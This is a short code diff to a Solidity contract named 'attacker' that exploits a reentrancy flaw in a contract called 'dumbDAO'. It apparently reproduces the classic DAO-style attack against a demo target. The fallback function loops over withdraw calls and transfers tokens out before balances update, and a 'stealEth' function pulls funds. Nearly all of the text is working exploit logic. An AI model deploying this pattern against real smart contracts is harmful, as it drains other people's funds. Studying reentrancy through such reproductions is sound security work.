@@ -10,15 +10,15 @@ contract attacker {
   uint public a     = 0;
 
   function () {
-    DefaultFunc(msg.sender,msg.value,a,dumbDAO(daoAddress).balances(this));
+    DefaultFunc(msg.sender,msg.value,a,dumbDAO(daoAddress).balances(this)-1);
     while (a<5) {
         a++;
       arr.push(a); //to help debug
-      if (daoAddress.balance-2*msg.value < 0){
-    //if (a==4){
-          dumbDAO(daoAddress).transferTokens(transferAddress,dumbDAO(daoAddress).balances(this));
+    //  if (daoAddress.balance-2*msg.value < 0){
+    if (a==4){
+          dumbDAO(daoAddress).transferTokens(transferAddress,dumbDAO(daoAddress).balances(this)-1);
       }
-      dumbDAO(daoAddress).withdraw(this,msg.value);
+      dumbDAO(daoAddress).withdraw(this);
     }
   }
 
@@ -26,8 +26,8 @@ contract attacker {
   function fundMe(){
   }
 
-  function stealEth(uint _amount){
-    dumbDAO(daoAddress).withdraw(this,_amount);
+  function stealEth(){
+    dumbDAO(daoAddress).withdraw(this);
   }
 
   function payOut(address _payee) returns (bool){
